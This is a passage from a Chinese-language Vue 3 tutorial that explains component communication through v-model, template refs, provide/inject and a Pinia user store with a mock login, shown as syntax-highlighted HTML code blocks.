    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>姓名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">:value</span>=<span class="hljs-string">"name"</span>
        @<span class="hljs-attr">input</span>=<span class="hljs-string">"$emit('update:name', $event.target.value)"</span>
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>邮箱：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">:value</span>=<span class="hljs-string">"email"</span>
        @<span class="hljs-attr">input</span>=<span class="hljs-string">"$emit('update:email', $event.target.value)"</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"email"</span>
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>年龄：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">:value</span>=<span class="hljs-string">"age"</span>
        @<span class="hljs-attr">input</span>=<span class="hljs-string">"$emit('update:age', parseInt($event.target.value) || 0)"</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"number"</span>
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-title function_">defineProps</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-title class_">String</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span>
})

<span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'update:name'</span>, <span class="hljs-string">'update:email'</span>, <span class="hljs-string">'update:age'</span>])
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>v-model</code>的核心优势：</p>
<ul>
<li>语法简洁，减少样板代码</li>
<li>符合双向绑定的直觉</li>
<li>支持多个v-model绑定</li>
<li>类型安全（配合TypeScript）</li>
</ul>
<p><strong>适用场景</strong>：自定义表单控件（如日期选择器、富文本编辑器）需要双向绑定。</p>
<hr/>
<h2 data-id="heading-5">3. Ref / 模板引用：直接操作组件</h2>
<p>当需要直接访问子组件或 DOM 元素时，模板引用是最佳选择。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 父组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"childRef"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">CustomForm</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"formRef"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"videoRef"</span> <span class="hljs-attr">controls</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./movie.mp4"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"video/mp4"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"controls"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"focusInput"</span>&gt;</span>聚焦输入框<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"getChildData"</span>&gt;</span>获取子组件数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"playVideo"</span>&gt;</span>播放视频<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"validateForm"</span>&gt;</span>验证表单<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onMounted, nextTick } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 创建引用</span>
<span class="hljs-keyword">const</span> childRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> formRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> videoRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-comment">// 确保 DOM 更新后访问</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">focusInput</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>()
  childRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">focusInput</span>()
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">getChildData</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (childRef.<span class="hljs-property">value</span>) {
    <span class="hljs-keyword">const</span> data = childRef.<span class="hljs-property">value</span>.<span class="hljs-title function_">getData</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子组件数据：'</span>, data)
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">playVideo</span> = (<span class="hljs-params"/>) =&gt; {
  videoRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">play</span>()
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">validateForm</span> = (<span class="hljs-params"/>) =&gt; {
  formRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">validate</span>()
}

<span class="hljs-comment">// 组件挂载后访问</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子组件实例：'</span>, childRef.<span class="hljs-property">value</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 子组件 ChildComponent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"inputEl"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入..."</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>内部数据：{{ internalData }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> inputEl = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> internalData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'这是内部数据'</span>)

<span class="hljs-comment">// 暴露给父组件的方法和数据</span>
<span class="hljs-title function_">defineExpose</span>({
  <span class="hljs-attr">focusInput</span>: <span class="hljs-function">() =&gt;</span> {
    inputEl.<span class="hljs-property">value</span>?.<span class="hljs-title function_">focus</span>()
  },
  <span class="hljs-attr">getData</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">internalData</span>: internalData.<span class="hljs-property">value</span>,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
    }
  },
  internalData
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>适用场景</strong>：需要调用子组件方法（如弹窗打开）、聚焦输入框、操作原生元素（如 video 播放）。</p>
<h2 data-id="heading-6">4. Provide / Inject：跨层级数据传递</h2>
<p>解决"prop 逐级传递"问题，实现祖先与后代组件的直接通信。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 根组件 App.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main-content"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Sidebar</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ContentArea</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Footer</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { provide, ref, reactive, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 提供用户信息</span>
<span class="hljs-keyword">const</span> currentUser = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">'admin'</span>,
  <span class="hljs-attr">permissions</span>: [<span class="hljs-string">'read'</span>, <span class="hljs-string">'write'</span>, <span class="hljs-string">'delete'</span>]
})

<span class="hljs-comment">// 提供应用配置</span>
<span class="hljs-keyword">const</span> appConfig = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">theme</span>: <span class="hljs-string">'dark'</span>,
  <span class="hljs-attr">language</span>: <span class="hljs-string">'zh-CN'</span>,
  <span class="hljs-attr">apiBaseUrl</span>: <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">VITE_API_URL</span>
})

<span class="hljs-comment">// 提供方法</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateUser</span> = (<span class="hljs-params">newUserData</span>) =&gt; {
  currentUser.<span class="hljs-property">value</span> = { ...currentUser.<span class="hljs-property">value</span>, ...newUserData }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateConfig</span> = (<span class="hljs-params">key, value</span>) =&gt; {
  appConfig[key] = value
}

<span class="hljs-comment">// 计算属性</span>
<span class="hljs-keyword">const</span> userPermissions = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> currentUser.<span class="hljs-property">value</span>.<span class="hljs-property">permissions</span>)

<span class="hljs-comment">// 提供数据和方法</span>
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'currentUser'</span>, currentUser)
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'appConfig'</span>, appConfig)
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'updateUser'</span>, updateUser)
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'updateConfig'</span>, updateConfig)
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'userPermissions'</span>, userPermissions)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 深层嵌套的组件 ContentArea.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content-area"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ArticleList</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// 这个组件不需要处理 props，直接渲染子组件</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 使用注入的组件 UserProfile.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-profile"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>用户信息<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"profile-card"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>姓名：{{ currentUser.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>角色：{{ currentUser.role }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>权限：{{ userPermissions.join(', ') }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>主题：{{ appConfig.theme }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleUpdateProfile"</span>&gt;</span>更新资料<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { inject } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 注入数据和方法</span>
<span class="hljs-keyword">const</span> currentUser = <span class="hljs-title function_">inject</span>(<span class="hljs-string">'currentUser'</span>)
<span class="hljs-keyword">const</span> appConfig = <span class="hljs-title function_">inject</span>(<span class="hljs-string">'appConfig'</span>)
<span class="hljs-keyword">const</span> userPermissions = <span class="hljs-title function_">inject</span>(<span class="hljs-string">'userPermissions'</span>)
<span class="hljs-keyword">const</span> updateUser = <span class="hljs-title function_">inject</span>(<span class="hljs-string">'updateUser'</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUpdateProfile</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">updateUser</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'李四'</span>,
    <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>Provide/Inject的优势</strong>：</p>
<ul>
<li>避免Props逐层传递的繁琐</li>
<li>实现跨层级组件通信</li>
<li>提供全局状态和方法的统一管理</li>
<li>提高代码的可维护性</li>
</ul>
<p><strong>适用场景</strong>：当数据需要从顶层组件传递到底层组件，中间隔了好几层（比如主题、用户信息、语言设置）。</p>
<hr/>
<h2 data-id="heading-7">5. Pinia：现代化状态管理</h2>
<p>对于复杂应用，Pinia 提供了更优秀的状态管理方案。</p>
<h3 data-id="heading-8">创建 Store</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// stores/user.js</span>
<span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'user'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">isLoggedIn</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">token</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">permissions</span>: []
  }),
  
  <span class="hljs-attr">getters</span>: {
    <span class="hljs-attr">userName</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">user</span>?.<span class="hljs-property">name</span> || <span class="hljs-string">'未登录用户'</span>,
    <span class="hljs-attr">isAdmin</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">user</span>?.<span class="hljs-property">role</span> === <span class="hljs-string">'admin'</span>,
    <span class="hljs-attr">hasPermission</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params">permission</span>) =&gt;</span> 
      state.<span class="hljs-property">permissions</span>.<span class="hljs-title function_">includes</span>(permission)
  },
  
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">credentials</span>) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 模拟 API 调用</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">mockLoginApi</span>(credentials)
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = response.<span class="hljs-property">user</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = response.<span class="hljs-property">token</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span> = <span class="hljs-literal">true</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">permissions</span> = response.<span class="hljs-property">permissions</span>
        
        <span class="hljs-comment">// 保存到 localStorage</span>
        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'token'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span>)
        
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> }
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'登录失败：'</span>, error)
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> }
      }
    },
    
    <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = <span class="hljs-literal">null</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = <span class="hljs-string">''</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span> = <span class="hljs-literal">false</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">permissions</span> = []
      
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'token'</span>)
    },
    
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">updateProfile</span>(<span class="hljs-params">userData</span>) {
      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'请先登录'</span>)
      }
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = { ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span>, ...userData }
      <span class="hljs-comment">// 这里可以调用 API 更新后端数据</span>
    }
  }
})

<span class="hljs-comment">// 模拟登录 API</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">mockLoginApi</span> = (<span class="hljs-params">credentials</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>({
        <span class="hljs-attr">user</span>: {
          <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
          <span class="hljs-attr">name</span>: credentials.<span class="hljs-property">username</span>,
          <span class="hljs-attr">role</span>: <span class="hljs-string">'admin'</span>
        },
        <span class="hljs-attr">token</span>: <span class="hljs-string">'mock-jwt-token'</span>,
        <span class="hljs-attr">permissions</span>: [<span class="hljs-string">'read'</span>, <span class="hljs-string">'write'</span>, <span class="hljs-string">'delete'</span>]
      })
    }, <span class="hljs-number">1000</span>)
  })
}
</code></pre>
<h3 data-id="heading-9">在组件中使用 Store</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- UserProfile.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-profile"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"userStore.isLoggedIn"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logged-in"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>欢迎回来，{{ userStore.userName }}！<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-info"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>角色：{{ userStore.user.role }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>权限：{{ userStore.permissions.join(', ') }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"actions"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
          @<span class="hljs-attr">click</span>=<span class="hljs-string">"updateName"</span> 
          <span class="hljs-attr">:disabled</span>=<span class="hljs-string">"!userStore.hasPermission('write')"</span>
        &gt;</span>
          更新姓名
        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"userStore.logout"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logout-btn"</span>&gt;</span>
          退出登录
        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logged-out"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">LoginForm</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/stores/user'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">LoginForm</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./LoginForm.vue'</span>

<span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()

<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateName</span> = (<span class="hljs-params"/>) =&gt; {
  userStore.<span class="hljs-title function_">updateProfile</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">`用户<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">36</span>).substr(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>)}</span>`</span>
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- LoginForm.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-form"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>用户登录<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> @<span class="hljs-attr">submit.prevent</span>=<span class="hljs-string">"handleLogin"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
          <span class="hljs-attr">v-model</span>=<span class="hljs-string">"credentials.username"</span> 
          <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"用户名"</span>
          <span class="hljs-attr">required</span>
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
          <span class="hljs-attr">v-model</span>=<span class="hljs-string">"credentials.password"</span> 
          <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> 
          <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"密码"</span>
          <span class="hljs-attr">required</span>
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">:disabled</span>=<span class="hljs-string">"loading"</span>&gt;</span>
        {{ loading ? '登录中...' : '登录' }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"messageType"</span>&gt;</span>
      {{ message }}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
